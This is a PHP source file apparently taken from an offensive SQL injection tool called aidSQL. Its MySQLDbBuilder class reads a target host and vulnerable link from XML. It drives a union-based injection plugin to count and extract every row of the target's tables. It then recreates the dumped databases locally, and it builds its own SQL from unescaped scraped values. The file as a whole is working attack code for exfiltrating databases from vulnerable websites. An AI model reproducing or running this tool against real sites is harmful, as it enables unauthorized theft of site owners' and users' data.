<?php

	namespace aidSQL\db {

		class MySQLDbBuilder {

			private	$_xmlFile		=	NULL;
			private	$_config			=	NULL;
			private	$_logger			=	NULL;
			private	$_httpAdapter	=	NULL;
			private	$_pLoader		=	NULL;

			public function __construct(Array $config,\aidSQL\http\adapter &$httpAdapter,\aidSQL\core\PluginLoader &$pLoader,\aidSQL\core\Logger &$log){

				$this->_config			=	$config;
				$this->_xmlFile		=	new \aidSQL\core\File($config["makedb"]);
				$this->setLog($log);
				$this->_httpAdapter	=	$httpAdapter;
				$pLoader->setConfig($config);
				$this->_pLoader		=	$pLoader;
				
				$this->makeDB();
	
			}

			public function setLog(\aidSQL\core\Logger &$logger){

				$this->_logger	=	$logger;
				$this->_logger->setPrepend('[' . __CLASS__ . ']');

			}


			private function log($msg=NULL, $color="white", $level=0, $toFile=FALSE) {

				if (isset($this->_options["log-all"])) {
					$toFile = TRUE;
				}

				if (!is_null($this->_logger)) {

					$this->_logger->setPrepend('[' . __CLASS__ . ']');
					$this->_logger->log($msg, $color, $level, $toFile);
					return TRUE;
				}

				return FALSE;

			}

			public function setConfig(Array $config){
				$this->_config	=	$config;
			}

			private function parseXML(){

				$dom	=	new \DomDocument("1.0");
				$dom->load($this->_xmlFile->getFile());

				$host				=	$dom->getElementsByTagName("host")->item(0)->nodeValue;
				$link				=	$dom->getElementsByTagName("vulnlink")->item(0)->nodeValue;
				$domInjection	=	$dom->getElementsByTagName("injection")->item(0)->childNodes;
				$injection		=	array();

				foreach($domInjection as $inject){

					$nodeName		=	$inject->nodeName;
					$injectChilds	=	$inject->childNodes;

					foreach($injectChilds as $injectChild){

						if(sizeof($injectChild->childNodes)>0){
							$injection[$nodeName][]	=	$injectChild->nodeValue;
						}else{
							$injection[$nodeName]	=	$injectChild->nodeValue;
						}

					}

				}

				$url	=	new \aidSQL\core\Url($link);
				$url->addRequestVariable($injection["requestVariable"],$injection["requestValue"]);

				foreach($injection["requestVariables"] as $name=>$value){

					$url->addRequestVariable($name,$value);

				}

				$this->_httpAdapter->setUrl($url);

				$schemasArray	=	array();
				$schemas			=	$dom->getElementsByTagName("schemas")->item(0)->childNodes;

				foreach($schemas as $schema){

					$schemaName	=	$schema->getAttribute("name");
					$schemasArray[$schemaName]	=	array();
					$tables							=	$schema->getElementsByTagName("table");

					foreach($tables as $table){

						$tableAttributes	=	array();
						$i						=	0;

						$tablesArray		=	array();

						while($table->attributes->item($i)){

							$name							=	$table->attributes->item($i)->name;
							$value						=	$table->attributes->item($i++)->value;

							$tableAttributes[$name]	=	$value;

						}

						$tableName	=	$tableAttributes["name"];
						unset($tableAttributes["name"]);

						$tablesArray["attributes"]	=	$tableAttributes;

						$columns			=	$table->childNodes;
						$columnsArray	=	array();

						foreach($columns as $column){

							$colName	=	$column->getAttribute("name");
							$columnsArray[$colName]	=	array();
							$colChilds	=	$column->childNodes;
							
							foreach($colChilds as $colChild){
								$columnsArray[$colName][$colChild->nodeName]	=	$colChild->nodeValue;
							}

							$tablesArray["columns"]	=	$columnsArray;

						}

						$schemasArray[$schemaName][$tableName]	=	$tablesArray;

					}

					

				}

				return $schemasArray;

			}

			public function makeDb(){

				$mysqli	=	@new \MySQLi($this->_config["dbhost"],"root",$this->_config["dbpass"]);

				if ($mysqli->connect_error) {
					throw(new \Exception('MySQLi Connect Error (' . $mysqli->connect_errno . '), check the host and password!'));
				}

				$schemas	=	$this->parseXml();
				$plugin	=	$this->_pLoader->getPluginInstance("sqli","mysql5",$this->_httpAdapter,$this->_logger);

				$plugin->injectionUnionWithConcat();

				foreach($schemas as $schemaName=>$schemaTables){

					$this->log("Creating database schema $schemaName",0,"light_green");

					if(!$this->createDatabase($mysqli,"aidSQL_".$schemaName)){
						throw(new \Exception("Couldnt create database aidSQL_$schemaName"));
					}

					$mysqli->select_db("aidSQL_".$schemaName);

					foreach($schemaTables as $schemaTableName=>$schemaTableValues){

						if($this->createTable($mysqli,$schemaTableName,$schemaTableValues)!==TRUE){
							throw(new \Exception("Couldnt create table $schemaTableName"));
						}

						$attributes			=	$schemaTableValues["attributes"];
						$columns				=	array_keys($schemaTableValues["columns"]);

						$select				=	implode(',0x7c,',$columns);
						$from					=	$schemaName.'.'.$schemaTableName;

						$count				=	$plugin->count($columns[0],$from);
						$count				=	$count[0] - 1;
						
						if($count==-1){

							$this->log("No registers found on this table",0,"yellow");
							continue;

						}else{

							$this->log("FOUND $count registers in table $schemaTableName",0,"light_cyan");

						}

						$parameters	=	$plugin->getInjectionParameters();

						for($i=0;$i<=$count;$i++){

							$parameters["limit"]	=	array($i,1);

							$plugin->setInjectionParameters($parameters);

							$values	=	$plugin->unionQuery($select,$from,array(),array());
							$values	=	$values[0];
							
							$values	=	explode('|',$values);

							if(!$this->insertRegisters($mysqli,$schemaTableName,$columns,$values)){
								throw(new \Exception("Couldnt insert registers on $schemaTableName table!"));
							}

						}

						$parameters["limit"]	=	array();
						$plugin->setInjectionParameters($parameters);

					}

				}

			}

			public function createDatabase(\MySQLi &$sqli,$schemaName){

				$sql	=	"DROP DATABASE IF EXISTS $schemaName";
				$sqli->query($sql);
				$sql	=	"CREATE DATABASE $schemaName";
				return $sqli->query($sql);

			}

			public function createTable(\MySQLi &$sqli,$tableName,Array $tableColumns){

				$sql	=	"CREATE TABLE $tableName(";

				$columns	=	array();
				foreach($tableColumns["columns"] as $columnName=>$columnSpecs){

					$columns[]="$columnName ".$columnSpecs["type"];

				}
				$sql.=implode(',',$columns).')';

				return $sqli->query($sql);

			}

			public function insertRegisters(\MySQLi &$sqli,$tableName,Array $columns,Array $registers){
			
				$sql		=	"INSERT INTO $tableName SET ";
				$columns	=	array_combine($columns,$registers);

				foreach($columns as $colName=>$colVal){
					$sql.="$colName='$colVal',";
				}

				$sql=substr($sql,0,-1);
				return $sqli->query($sql);

			}

		}

	}

?>
